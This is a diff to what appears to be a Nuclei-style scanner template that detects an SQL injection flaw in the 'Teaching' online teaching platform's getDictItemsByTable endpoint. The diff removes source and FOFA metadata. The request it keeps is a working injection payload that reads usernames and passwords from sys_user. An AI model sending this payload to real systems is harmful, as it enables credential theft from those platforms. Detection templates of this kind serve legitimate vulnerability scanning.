@@ -3,12 +3,8 @@ info:
   name: Teaching 在线教学平台getDictItemsByTable存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ysqvdfhohrvt8pu2'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ysqvdfhohrvt8pu2
-    fofa: icon_hash="1778610975"
 http:
 - raw:
   - 'GET /api/sys/ng-alain/getDictItemsByTable/''%20from%20sys_user/username,password%20''/x.js HTTP/1.1
